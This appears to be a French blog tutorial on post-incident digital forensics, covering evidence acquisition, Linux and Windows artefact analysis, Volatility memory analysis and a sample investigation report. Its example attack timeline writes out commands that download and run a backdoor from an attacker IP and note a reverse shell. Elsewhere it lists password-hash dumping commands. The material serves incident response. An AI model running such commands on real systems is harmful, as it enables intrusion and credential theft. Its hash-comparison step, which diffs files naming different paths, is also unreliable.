# Forensics numérique : investigation après un incident

La forensique numérique est l'art de **collecter, préserver et analyser** des preuves numériques après un incident de sécurité. Que ce soit pour comprendre comment un attaquant est entré, ce qu'il a fait, ou pour préparer une action légale, le forensics suit une méthodologie rigoureuse.

## Les principes fondamentaux

```
Règle d'or : PRÉSERVER AVANT D'ANALYSER

Ne jamais modifier les preuves originales :
✅ Travailler sur des copies (images disque)
✅ Calculer les hashes AVANT toute analyse (intégrité)
✅ Documenter chaque action avec horodatage
✅ Maintenir la chaîne de custody

Ordre de volatilité (collecter du plus volatile au moins volatile) :
1. Registres CPU et cache               (perdus à l'extinction)
2. Mémoire RAM                          (perdue à l'extinction)
3. Trafic réseau                        (volatile)
4. Processus en cours                   (volatile)
5. Connexions réseau actives            (volatile)
6. Fichiers temporaires                 (semi-volatile)
7. Disque dur                           (persistant)
8. Logs distants / sauvegardes          (persistant)
```

## Acquisition de preuves

### Mémoire RAM (volatile)

```bash
# Linux - Acquisition de la RAM avec LiME (Linux Memory Extractor)
# Sur la machine suspecte (si encore accessible) :
sudo insmod lime.ko "path=/external/ram.lime format=lime"

# Windows - Winpmem
winpmem.exe ram_dump.raw

# Analyser avec Volatility 3
vol3 -f ram.lime linux.pslist     # Liste des processus
vol3 -f ram.lime linux.netstat    # Connexions réseau actives
vol3 -f ram.lime linux.bash       # Historique bash en mémoire
vol3 -f ram.lime linux.malfind    # Code injecté suspect

# Windows RAM analysis
vol3 -f ram.raw windows.pslist
vol3 -f ram.raw windows.cmdline    # Arguments des processus
vol3 -f ram.raw windows.netscan    # Connexions réseau
vol3 -f ram.raw windows.malfind    # Processus/DLL suspects
vol3 -f ram.raw windows.dumpfiles  # Extraire les fichiers en mémoire
vol3 -f ram.raw windows.hashdump   # Hashes des mots de passe
```

### Image disque

```bash
# Créer une image disque avec dd (préserver les preuves)
# Calculer le hash AVANT
sha256sum /dev/sda > hash_before.txt

# Créer l'image (bit-for-bit copy)
dd if=/dev/sda of=/external/disk_image.img bs=4M conv=noerror,sync status=progress

# Alternative plus rapide avec dcfldd
dcfldd if=/dev/sda of=/external/disk_image.img hash=sha256 hashlog=hash.log

# Vérifier l'intégrité de l'image
sha256sum /external/disk_image.img > hash_after.txt
diff hash_before.txt hash_after.txt  # Doit être identique

# FTK Imager (Windows) - Interface graphique professionnelle
# Autopsy - Plateforme d'analyse forensique open source
```

## Analyse forensique Linux

```bash
# Timeline d'activité des fichiers
# Mactime : MAC times (Modified, Accessed, Changed)
find /  -printf "%T@ %p\n" 2>/dev/null | sort -n | \
    awk '{print strftime("%Y-%m-%d %H:%M:%S", $1), $2}' | \
    grep "2024-04" > activity_april_2024.txt

# Fichiers modifiés récemment (30 derniers jours)
find / -mtime -30 -type f 2>/dev/null | grep -v /proc | grep -v /sys

# Fichiers supprimés mais récupérables avec PhotoRec/TestDisk
photorec /log /d recovered_files/ disk_image.img

# Analyse des logs système
# Quand le système a-t-il été compromis ?
last -F | head -20          # Dernières connexions
lastb -F | head -20         # Tentatives échouées
who -a                      # Utilisateurs actuellement connectés
cat /var/log/auth.log | grep "Accepted\|Failed" | tail -100

# Fichiers SUID/SGID modifiés récemment (possible backdoor)
find / -perm -4000 -mtime -7 2>/dev/null

# Crontabs (persistence possible)
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u $user -l 2>/dev/null | grep -v "^#" | grep -v "^$"
done
cat /etc/crontab /etc/cron.d/*

# Connexions réseau actives au moment de l'incident
ss -antp
netstat -antp
lsof -i

# Historique bash de tous les utilisateurs
cat /root/.bash_history
for user in /home/*; do cat $user/.bash_history 2>/dev/null; done
```

## Analyse forensique Windows

```powershell
# Artefacts Windows clés pour l'investigation

# 1. Event Logs (journaux d'événements)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4648,4672,4720,4728} |
    Select-Object TimeCreated, Id, Message |
    Export-Csv "security_events.csv"

# 2. Prefetch (traces d'exécution de programmes)
# C:\Windows\Prefetch\*.pf
# Contient : nom du programme, nombre d'exécutions, dernière exécution
Get-ChildItem C:\Windows\Prefetch | Sort-Object LastWriteTime -Descending | Select-Object -First 20

# 3. Registry (persistence et traces)
# Clés de démarrage
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Programmes récemment utilisés
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"

# 4. LNK Files (fichiers raccourci - traces d'accès)
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
    Select-Object Name, CreationTime, LastWriteTime |
    Sort-Object LastWriteTime -Descending

# 5. Browser History
# Chrome : $APPDATA\Google\Chrome\User Data\Default\History (SQLite)
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
Copy-Item $chromePath "chrome_history_copy.db"
# Analyser avec DB Browser for SQLite

# 6. Amcache (traces d'exécution)
# C:\Windows\AppCompat\Programs\Amcache.hve
# Contient hash SHA1 de chaque exécutable lancé

# 7. Windows Timeline
# C:\Users\[user]\AppData\Local\ConnectedDevicesPlatform\
# Base de données SQLite avec activité utilisateur
```

## Volatility — Analyse mémoire avancée

```bash
# Identifier le profil (Volatility 2)
volatility -f memory.dmp imageinfo

# Lister tous les processus avec arbre parent-enfant
volatility -f memory.dmp --profile=Win10x64 pstree

# Détecter les processus avec injection de code
volatility -f memory.dmp --profile=Win10x64 malfind

# Extraire un processus suspect pour analyse statique
volatility -f memory.dmp --profile=Win10x64 procdump -p 1234 --dump-dir=./dumps/

# Connexions réseau au moment du dump
volatility -f memory.dmp --profile=Win10x64 netscan

# Analyser les DLLs chargées par un processus
volatility -f memory.dmp --profile=Win10x64 dlllist -p 1234

# Hives de registre en mémoire
volatility -f memory.dmp --profile=Win10x64 hivelist
volatility -f memory.dmp --profile=Win10x64 printkey -K "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Hashs des mots de passe
volatility -f memory.dmp --profile=Win10x64 hashdump
```

## Timeline forensique

```python
# Créer une timeline complète de l'incident

import pandas as pd
from datetime import datetime

def creer_timeline(logs_dict):
    events = []

    # Windows Event Logs
    for event in logs_dict.get('windows_events', []):
        events.append({
            'timestamp': event['TimeCreated'],
            'source': 'Windows Event Log',
            'event_id': event['Id'],
            'description': event['Message'][:200]
        })

    # Syslog Linux
    for line in logs_dict.get('syslog', []):
        events.append({
            'timestamp': parse_syslog_date(line),
            'source': 'Syslog',
            'description': line
        })

    # Trier par timestamp
    timeline = pd.DataFrame(events)
    timeline.sort_values('timestamp', inplace=True)

    return timeline

# Exemple de timeline d'incident
"""
2024-04-15 08:23:11 | Auth Log     | Failed password for root from 185.220.101.5
2024-04-15 08:23:45 | Auth Log     | Failed password for admin from 185.220.101.5
2024-04-15 08:24:02 | Auth Log     | Accepted password for www-data from 185.220.101.5
2024-04-15 08:24:15 | Bash History | wget http://185.220.101.5/backdoor.sh
2024-04-15 08:24:17 | Bash History | chmod +x backdoor.sh && ./backdoor.sh
2024-04-15 08:24:18 | Crontab      | */5 * * * * /tmp/.hidden/persist.sh
2024-04-15 08:25:00 | Netstat      | TCP ESTABLISHED 185.220.101.5:4444 (reverse shell)
"""
```

## Rapport d'investigation

```markdown
# Rapport d'Investigation Forensique

## Résumé Exécutif
- Date de l'incident : 15 avril 2024, 08:24
- Systèmes affectés : Serveur Web prod-web-01
- Impact : Accès non autorisé, installation de backdoor
- Données potentiellement compromises : Base de données clients

## Chronologie de l'incident
[Timeline détaillée]

## Vecteur d'attaque initial
Brute force sur SSH → Mot de passe faible du compte www-data

## Actions de l'attaquant
1. Connexion SSH via mot de passe brute-force
2. Téléchargement d'un backdoor depuis 185.220.101.5
3. Installation d'une tâche cron persistante
4. Établissement d'un reverse shell

## Indicateurs de Compromission (IoCs)
- IP attaquante : 185.220.101.5
- Fichier malveillant : /tmp/.hidden/persist.sh
  SHA256 : a1b2c3d4e5f6...
- Crontab malicieux : */5 * * * * /tmp/.hidden/persist.sh

## Recommandations
1. Désactiver l'authentification par mot de passe SSH
2. Activer fail2ban
3. Réinitialiser tous les mots de passe
4. Appliquer les mises à jour en attente
```

## Conclusion

La forensique numérique est une discipline qui demande **rigueur, méthode et rapidité**. La collecte dans l'ordre de volatilité, la préservation des preuves et la documentation exhaustive sont non-négociables. Des outils comme **Autopsy, Volatility et The Sleuth Kit** permettent d'analyser des incidents complexes même sans budget commercial.

---
*Retour à l'accueil : [Temgus.CyberBlog](../index.html)*
